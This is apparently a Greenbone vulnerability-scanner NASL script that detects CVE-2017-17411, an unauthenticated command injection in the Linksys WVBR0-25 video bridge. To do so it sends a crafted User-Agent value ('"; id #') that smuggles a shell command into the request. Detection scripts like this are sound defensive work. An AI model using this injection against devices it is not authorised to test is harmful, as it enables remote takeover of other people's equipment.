# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/o:linksys:wvbr0-25_firmware";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.140625");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2017-12-22 13:48:08 +0700 (Fri, 22 Dec 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2018-08-28 21:29:00 +0000 (Tue, 28 Aug 2018)");

  script_cve_id("CVE-2017-17411");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Linksys WVBRO25 RCE Vulnerability");

  script_category(ACT_GATHER_INFO);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_linksys_devices_consolidation.nasl");
  script_mandatory_keys("linksys/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Linksys WVBRO-25 is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"insight", value:"The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect
  wireless Genie cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41 of the web
  management portal via the User-Agent header. Authentication is not required to exploit this vulnerability.");

  script_tag(name:"impact", value:"An unauthenticated attacker may execute arbitrary code.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"Linksys WVBRO-25 prior to firmware version 1.0.41.");

  script_tag(name:"solution", value:"Updated firmware to version 1.0.41 or later.");

  script_xref(name:"URL", value:"https://www.thezdi.com/blog/2017/12/13/remote-root-in-directvs-wireless-video-bridge-a-tale-of-rage-and-despair");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

if (!port = get_app_port(cpe: CPE, service: "www"))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

req = http_get_req(port: port, url: "/", user_agent: '"; id #');
res = http_keepalive_send_recv(port: port, data: req);

if (res =~ 'uid=[0-9]+.*gid=[0-9]+') {
  report = "It was possible to execute the 'id' command.\n\nResult:\n" +
           egrep(pattern: 'uid=[0-9]+.*gid=[0-9]+', string: res);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
